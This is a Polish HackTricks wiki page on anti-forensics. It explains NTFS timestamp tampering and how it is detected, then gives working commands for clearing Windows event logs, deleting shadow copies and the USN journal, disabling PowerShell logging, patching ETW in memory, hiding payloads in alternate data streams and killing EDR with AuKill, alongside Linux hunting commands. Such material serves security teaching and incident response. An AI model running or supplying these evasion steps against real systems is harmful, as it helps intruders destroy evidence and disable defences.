# Techniki antyforensyczne

{{#include ../../banners/hacktricks-training.md}}

## Znaczniki czasu

Atakujący może być zainteresowany **zmianą znaczników czasu plików**, aby uniknąć wykrycia.\
Znaczniki czasu można znaleźć wewnątrz MFT w atrybutach `$STANDARD_INFORMATION` \_\_ oraz \_\_ `$FILE_NAME`.

Oba atrybuty zawierają 4 znaczniki czasu: **modyfikacji**, **dostępu**, **utworzenia** oraz **modyfikacji wpisu MFT** (MACE lub MACB).

**Eksplorator Windows** i inne narzędzia wyświetlają informacje z **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

To narzędzie **modyfikuje** informacje o znacznikach czasu wewnątrz **`$STANDARD_INFORMATION`**, ale **nie** modyfikuje informacji wewnątrz **`$FILE_NAME`**. Dlatego możliwe jest **zidentyfikowanie** **podejrzanej** **aktywności**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) to funkcja systemu plików NTFS (Windows NT file system), która śledzi zmiany na woluminie. Narzędzie [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) umożliwia analizę tych zmian.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) to funkcja systemu plików NTFS (Windows NT file system), która śledzi zmiany na woluminie. Narzędzie...](<../../images/image (801).png>)

Poprzedni obraz przedstawia **dane wyjściowe** pokazane przez **narzędzie**, w których można zauważyć, że w pliku **wykonano pewne zmiany**.

### $LogFile

**Wszystkie zmiany metadanych systemu plików są rejestrowane** w procesie znanym jako [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zarejestrowane metadane są przechowywane w pliku o nazwie `**$LogFile**`, znajdującym się w katalogu głównym systemu plików NTFS. Narzędzia takie jak [LogFileParser](https://github.com/jschicht/LogFileParser) mogą służyć do analizowania tego pliku i identyfikowania zmian.

![Usnjrnl - $LogFile: Wszystkie zmiany metadanych systemu plików są rejestrowane w procesie znanym jako write-ahead logging. Zarejestrowane metadane są przechowywane w pliku o nazwie $LogFile, znajdującym się w katalogu głównym...](<../../images/image (137).png>)

Ponownie, w danych wyjściowych narzędzia można zauważyć, że **wykonano pewne zmiany**.

Za pomocą tego samego narzędzia można zidentyfikować, **kiedy zmodyfikowano znaczniki czasu**:

![Usnjrnl - $LogFile: Za pomocą tego samego narzędzia można zidentyfikować, kiedy zmodyfikowano znaczniki czasu](<../../images/image (1089).png>)

- CTIME: Czas utworzenia pliku
- ATIME: Czas modyfikacji pliku
- MTIME: Modyfikacja wpisu MFT pliku
- RTIME: Czas dostępu do pliku

### Porównanie `$STANDARD_INFORMATION` i `$FILE_NAME`

Innym sposobem identyfikacji podejrzanie zmodyfikowanych plików jest porównanie czasu w obu atrybutach w celu znalezienia **niezgodności**.

### Nanosekundy

Znaczniki czasu **NTFS** mają **precyzję** wynoszącą **100 nanosekund**. Dlatego znalezienie plików ze znacznikami czasu takimi jak 2010-10-10 10:10:**00.000:0000 jest bardzo podejrzane**.

### SetMace - Anti-forensic Tool

To narzędzie może modyfikować oba atrybuty: `$STARNDAR_INFORMATION` i `$FILE_NAME`. Jednak od Windows Vista do modyfikacji tych informacji wymagany jest działający system operacyjny.

## Ukrywanie danych

NFTS używa klastrów i minimalnego rozmiaru informacji. Oznacza to, że jeśli plik zajmuje jeden klaster i połowę kolejnego, **pozostała połowa nigdy nie zostanie wykorzystana**, dopóki plik nie zostanie usunięty. Możliwe jest więc **ukrywanie danych w tej wolnej przestrzeni**.

Istnieją narzędzia, takie jak slacker, które umożliwiają ukrywanie danych w tej „ukrytej” przestrzeni. Jednak analiza `$logfile` i `$usnjrnl` może wykazać, że dodano pewne dane:

![SetMace - Anti-forensic Tool - Ukrywanie danych: Istnieją narzędzia, takie jak slacker, które umożliwiają ukrywanie danych w tej „ukrytej” przestrzeni. Jednak analiza $logfile i $usnjrnl może wykazać, że...](<../../images/image (1060).png>)

Następnie możliwe jest odzyskanie wolnej przestrzeni za pomocą narzędzi takich jak FTK Imager. Należy pamiętać, że tego rodzaju narzędzie może zapisywać zawartość w postaci obfuskowanej, a nawet zaszyfrowanej.

## UsbKill

To narzędzie **wyłącza komputer po wykryciu dowolnej zmiany** w portach **USB**.\
Można je wykryć, sprawdzając uruchomione procesy i **analizując każdy uruchomiony skrypt Python**.

## Live Linux Distributions

Te dystrybucje są **uruchamiane w pamięci RAM**. Jedynym sposobem ich wykrycia jest sytuacja, w której system plików NTFS jest zamontowany z uprawnieniami do zapisu. Jeśli jest zamontowany tylko z uprawnieniami do odczytu, wykrycie intruzji nie będzie możliwe.

## Bezpieczne usuwanie

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Konfiguracja Windows

Możliwe jest wyłączenie kilku metod logowania Windows, aby znacznie utrudnić analizę forensyczną.

### Wyłączanie znaczników czasu - UserAssist

Jest to klucz rejestru, który przechowuje daty i godziny uruchomienia każdego pliku wykonywalnego przez użytkownika.

Wyłączenie UserAssist wymaga wykonania dwóch kroków:

1. Ustaw oba klucze rejestru: `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` oraz `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` na zero, aby wskazać, że chcemy wyłączyć UserAssist.
2. Usuń poddrzewa rejestru przypominające `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Wyłączanie znaczników czasu - Prefetch

Funkcja ta zapisuje informacje o uruchamianych aplikacjach w celu poprawy wydajności systemu Windows. Może być jednak również przydatna w analizie forensycznej.

- Uruchom `regedit`
- Wybierz ścieżkę `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknij prawym przyciskiem myszy zarówno `EnablePrefetcher`, jak i `EnableSuperfetch`
- Wybierz opcję Modify dla każdego z nich, aby zmienić wartość z 1 (lub 3) na 0
- Uruchom ponownie system

### Wyłączanie znaczników czasu - Last Access Time

Za każdym razem, gdy folder jest otwierany z woluminu NTFS na serwerze Windows NT, system zapisuje czas, aby **zaktualizować pole znacznika czasu w każdym wyświetlonym folderze**, nazywane czasem ostatniego dostępu. Na intensywnie używanym woluminie NTFS może to wpływać na wydajność.

1. Otwórz Edytor rejestru (Regedit.exe).
2. Przejdź do `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Znajdź `NtfsDisableLastAccessUpdate`. Jeśli nie istnieje, dodaj wartość DWORD i ustaw jej wartość na 1, co wyłączy ten proces.
4. Zamknij Edytor rejestru i uruchom ponownie serwer.

### Usuwanie historii USB

Wszystkie **wpisy urządzeń USB** są przechowywane w Rejestrze Windows, pod kluczem rejestru **USBSTOR**, który zawiera podklucze tworzone za każdym razem, gdy podłączysz urządzenie USB do komputera lub laptopa. Ten klucz można znaleźć tutaj: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Usunięcie tego klucza** spowoduje usunięcie historii USB.\
Możesz również użyć narzędzia [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), aby upewnić się, że wpisy zostały usunięte (i aby je usunąć).

Innym plikiem przechowującym informacje o urządzeniach USB jest `setupapi.dev.log`, znajdujący się w `C:\Windows\INF`. Ten plik również należy usunąć.

### Wyłączanie kopii w tle

**Wyświetl** kopie w tle za pomocą `vssadmin list shadowstorage`\
**Usuń** je, uruchamiając `vssadmin delete shadow`

Możesz również usunąć je za pomocą GUI, wykonując kroki opisane w [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Aby wyłączyć kopie w tle, wykonaj [poniższe kroki](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otwórz program Services, wpisując „services” w polu wyszukiwania tekstowego po kliknięciu przycisku Start systemu Windows.
2. Na liście znajdź „Volume Shadow Copy”, zaznacz go, a następnie otwórz Properties, klikając prawym przyciskiem myszy.
3. Z rozwijanego menu „Startup type” wybierz Disabled, a następnie potwierdź zmianę, klikając Apply i OK.

Możliwe jest również zmodyfikowanie konfiguracji określającej, które pliki będą kopiowane do kopii w tle, w rejestrze `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Nadpisywanie usuniętych plików

- Możesz użyć **narzędzia Windows**: `cipher /w:C`. Spowoduje to usunięcie wszelkich danych z dostępnego, niewykorzystanego miejsca na dysku C.
- Możesz również użyć narzędzi takich jak [**Eraser**](https://eraser.heidi.ie)

### Usuwanie dzienników zdarzeń Windows

- Windows + R --> eventvwr.msc --> Rozwiń „Windows Logs” --> Kliknij prawym przyciskiem myszy każdą kategorię i wybierz „Clear Log”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Wyłączanie dzienników zdarzeń Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- W sekcji usług wyłącz usługę „Windows Event Log”
- `WEvtUtil.exec clear-log` lub `WEvtUtil.exe cl`

### Wyłączanie $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Zaawansowane logowanie i manipulowanie śladami (2023-2025)

### Rejestrowanie bloków skryptów/modułów PowerShell

Najnowsze wersje Windows 10/11 i Windows Server przechowują **obszerne artefakty forensyczne PowerShell** w
`Microsoft-Windows-PowerShell/Operational` (zdarzenia 4104/4105/4106).
Atakujący mogą wyłączyć je lub wyczyścić w locie:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Obrońcy powinni monitorować zmiany w tych kluczach rejestru oraz masowe usuwanie zdarzeń PowerShell.

### ETW (Event Tracing for Windows) Patch

Produkty zabezpieczeń endpointów w dużym stopniu polegają na ETW. Popularną metodą evasion w 2024 roku jest spatchowanie `ntdll!EtwEventWrite`/`EtwEventWriteFull` w pamięci, aby każde wywołanie ETW zwracało `STATUS_SUCCESS` bez emitowania zdarzenia:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (np. `EtwTiSwallow`) implementują tę samą primitive w PowerShell lub C++.
Ponieważ patch jest **process-local**, EDR-y działające wewnątrz innych procesów mogą go przeoczyć.
Detection: porównaj `ntdll` w pamięci z wersją na dysku albo wykonaj hook przed user-mode.

### Alternate Data Streams (ADS) Revival

W kampaniach malware z 2023 roku (np. loaderach **FIN12**) zaobserwowano umieszczanie binariów drugiego etapu
wewnątrz ADS, aby pozostać niewidocznymi dla tradycyjnych skanerów:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Wylicz streams za pomocą `dir /R`, `Get-Item -Stream *` lub narzędzia Sysinternals `streams64.exe`.
Skopiowanie pliku hosta do FAT/exFAT lub przez SMB usunie ukryty stream i może zostać wykorzystane
przez investigatorów do odzyskania payloadu.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver jest obecnie rutynowo wykorzystywane do **anti-forensics** podczas
intruzji ransomware.
Open-source'owe narzędzie **AuKill** ładuje podpisany, ale podatny driver (`procexp152.sys`), aby
wstrzymać lub zakończyć działanie EDR i sensorów forensic **przed szyfrowaniem i zniszczeniem logów**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Sterownik jest następnie usuwany, pozostawiając minimalną ilość artefaktów.<sup>[[1]](#references)</sup>
Mitigations: włącz Microsoft vulnerable-driver blocklist (HVCI/SAC)
i generuj alerty dotyczące tworzenia kernel-service z user-writable paths.

---

## Linux Anti-Forensics: Self-Patching i Cloud C2 (2023–2025)

### Self-patching zainfekowanych usług w celu ograniczenia wykrywania (Linux)
Adversaries coraz częściej wykonują „self-patching” usługi zaraz po jej wykorzystaniu, aby zarówno zapobiec ponownemu wykorzystaniu, jak i ograniczyć vulnerability-based detections. Chodzi o zastąpienie podatnych komponentów najnowszymi legalnymi upstream binaries/JARs, dzięki czemu skanery zgłaszają hosta jako zaktualizowanego, podczas gdy persistence i C2 pozostają aktywne.<sup>[[3]](#references)</sup>

Przykład: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Po Post-exploitation attackers pobrali legalne JARs z Maven Central (repo1.maven.org), usunęli podatne JARs z instalacji ActiveMQ i zrestartowali brokera.
- Zamknęło to początkowe RCE, jednocześnie zachowując inne footholds (cron, zmiany konfiguracji SSH, oddzielne C2 implants).

Przykład operacyjny (ilustracyjny)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Wskazówki dotyczące forensics/huntingu
- Przejrzyj katalogi usług pod kątem nieplanowanych podmian plików binarnych/JAR:
- Debian/Ubuntu: `dpkg -V activemq` i porównaj hashe/ścieżki plików z mirrorami repozytoriów.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Szukaj wersji JAR obecnych na dysku, które nie są własnością package managera, lub dowiązań symbolicznych zaktualizowanych poza standardowym procesem.
- Oś czasu: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` w celu korelacji ctime/mtime z okresem kompromitacji.
- Historia powłoki/telemetria procesów: ślady `curl`/`wget` do `repo1.maven.org` lub innych CDN-ów artefaktów bezpośrednio po początkowej eksploatacji.
- Change management: zweryfikuj, kto zastosował „patch” i dlaczego, a nie tylko to, że obecna jest wersja po patchu.

### Cloud-service C2 z bearer tokens i anti-analysis stagers
Zaobserwowany tradecraft łączył wiele długotrwałych ścieżek C2 oraz packaging utrudniający analizę:<sup>[[3]](#references)</sup>
- Zabezpieczone hasłem loadery ELF z PyInstaller, utrudniające sandboxing i analizę statyczną (np. zaszyfrowany PYZ, tymczasowa ekstrakcja do `/_MEI*`).
- Wskaźniki: wyniki `strings`, takie jak `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Artefakty runtime: ekstrakcja do `/tmp/_MEI*` lub niestandardowych ścieżek `--runtime-tmpdir`.
- C2 oparte na Dropbox z hardcoded OAuth Bearer tokens
- Markery sieciowe: `api.dropboxapi.com` / `content.dropboxapi.com` z `Authorization: Bearer <token>`.
- Prowadź hunting w proxy/NetFlow/Zeek/Suricata pod kątem wychodzącego HTTPS do domen Dropbox z workloadów serwerowych, które zwykle nie synchronizują plików.
- Równoległe/zapasowe C2 przez tunneling (np. Cloudflare Tunnel `cloudflared`) zapewniające kontrolę, jeśli jeden kanał zostanie zablokowany.
- Hostowe IOC: procesy/jednostki `cloudflared`, konfiguracja w `~/.cloudflared/*.json`, wychodzące połączenia 443 do krawędzi Cloudflare.

### Persistence i „hardening rollback” w celu utrzymania dostępu (przykłady Linux)
Atakujący często łączą self-patching z trwałymi ścieżkami dostępu:<sup>[[3]](#references)</sup>
- Cron/Anacron: modyfikacje stubu `0anacron` w każdym katalogu `/etc/cron.*/` w celu okresowego wykonywania.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: włączanie logowania roota i zmiana domyślnych shellów dla kont o niskich uprawnieniach.
- Hunt pod kątem włączenia logowania roota:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt pod kątem podejrzanych interaktywnych shellów na kontach systemowych (np. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Losowe artefakty beaconów o krótkich nazwach (8 znaków alfabetu) zapisywane na dysku, które dodatkowo łączą się z cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Obrońcy powinni korelować te artefakty z zewnętrzną ekspozycją i zdarzeniami patchowania usług, aby wykryć anti-forensic self-remediation wykorzystywane do ukrycia początkowej eksploatacji.

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
